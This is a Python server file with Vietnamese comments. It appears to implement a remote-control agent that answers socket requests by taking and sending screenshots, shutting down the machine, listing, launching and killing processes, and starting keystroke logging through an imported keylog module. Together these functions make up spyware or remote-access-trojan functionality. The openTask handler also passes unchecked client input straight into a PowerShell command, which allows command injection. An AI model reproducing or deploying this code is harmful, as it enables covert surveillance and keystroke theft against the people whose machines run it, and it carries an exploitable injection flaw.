import subprocess
import pyautogui
import keylog
from pynput.keyboard import Key
import os

#Chụp ảnh
def takePicture(client):
    try:
        image = pyautogui.screenshot()
        filename = "screenshot.png"  # Use a consistent filename
        image.save(filename)

        with open(filename, 'rb') as myfile:
            bytess = myfile.read()
            client.sendall(bytess)
    except pyautogui.FailSafeException:
        print("Khong the chup man hinh do fail-safe exception")
    except Exception as e:
        print("Khong the chup man hinh:", e)


#shutdown
def shutdown(client):
    os.system("shutdown /s /t 30")
    client.send(bytes("Da tat may", "utf-8"))
    print("ShutDown")

#Xem tien trinh
def processRunning(client):
    print("ProcessRunning")
    cmd = 'powershell "Get-Process |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
    ProccessProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    count = 0
    length = 0
    Name = ['' for i in range(100000)]
    ID = ['' for i in range(100000)]
    Thread = ['' for i in range(100000)]
    for line in ProccessProc.stdout:
        if line.rstrip():
            msg = line.decode().strip()
            parts = msg.split()
            if len(parts) >= 3:
                ID[length] = parts[0]
                Name[length] = parts[1]
                Thread[length] = " ".join(parts[2:])
                length += 1
    client.sendall(bytes(str(length),"utf-8"))
    for i in range(length):
        client.sendall(bytes(ID[i],"utf-8"))
        client.recv(1024)
    for i in range(length):
        client.sendall(bytes(Name[i], "utf-8"))
        client.recv(1024)
    for i in range(length):
        client.sendall(bytes(Thread[i], "utf-8"))
        client.recv(1024)

#Mở ứng dụng
def openTask(client):
    print("OpenTask")
    m = client.recv(1024)
    msg = str(m)
    msg = msg[2:]
    msg = msg[:len(msg)-1]
    print(str(msg))
    print("C:/Windows/System32/" + msg + ".exe")
    cmd = 'powershell start ' + msg
    subprocess.call(cmd)
    client.send(bytes("Da mo", "utf-8"))

#dừng tác vụ
def killApp(client):
    print("KillApp")
    m = client.recv(1024)
    msg = str(m)
    msg = msg[2:]
    msg = msg[:len(msg)-1]
    print(str(msg))
    
    taskkillexe = "c:/windows/system32/taskkill.exe"
    taskkillparam = [taskkillexe, '/F', '/IM', msg + ".exe"]  # Specify .exe extension
    subprocess.call(taskkillparam)
    
    client.sendall(bytes("Da xoa tac vu", "utf-8"))

def killTask(client):
    print("KillTask")
    m = client.recv(1024)
    msg = str(m)
    msg = msg[2:]
    msg = msg[:len(msg)-1]
    print(str(msg))
    
    taskkillexe = "c:/windows/system32/taskkill.exe"
    taskkillparam = [taskkillexe, '/F', '/PID', msg]  # Use /PID parameter instead of /IM
    subprocess.call(taskkillparam)
    
    client.sendall(bytes("Da xoa tac vu", "utf-8"))
#xem các ứng dụng đang chay
def appRunning(client):
    print("AppRunning")
    cmd = 'powershell "Get-Process |where {$_.mainWindowTitle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
    appProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    count = 0
    length = 0
    Name = ['' for i in range(100)]
    ID = ['' for i in range(100)]
    Thread = ['' for i in range(100)]
    for line in appProc.stdout:
        if line.rstrip():
            msg = line.decode().strip()
            parts = msg.split()
            if len(parts) >= 3:
                ID[length] = parts[0]
                Name[length] = parts[1]
                Thread[length] = " ".join(parts[2:])
                length += 1
    client.sendall(bytes(str(length),"utf-8"))
    for i in range(length):
        client.sendall(bytes(ID[i],"utf-8"))
        client.recv(1024)
    for i in range(length):
        client.sendall(bytes(Name[i], "utf-8"))
        client.recv(1024)
    for i in range(length):
        client.sendall(bytes(Thread[i], "utf-8"))
        client.recv(1024)

def takeRequest(client):
    while True:
        Request = keylog.readRequest(client)
        print(Request)
        if not Request:
            client.close()
            break
        print("--> Got a request\n")
        if "TakePicture" == Request:
            takePicture(client)
        elif "Shutdown" == Request:
            shutdown(client)
        elif "ProcessRunning" == Request:
            processRunning(client)
        elif "KillApp" == Request:
            killApp(client)
        elif "KillTask" == Request:
            killTask(client)
        elif "OpenTask" == Request:
            openTask(client)
        elif "AppRunning" == Request:
            appRunning(client)
        elif "HookKey" == Request:
            print("KeyStroke")
            client.sendall(bytes("Đã nhận", "utf-8"))
            keylog.Keystroke(client)
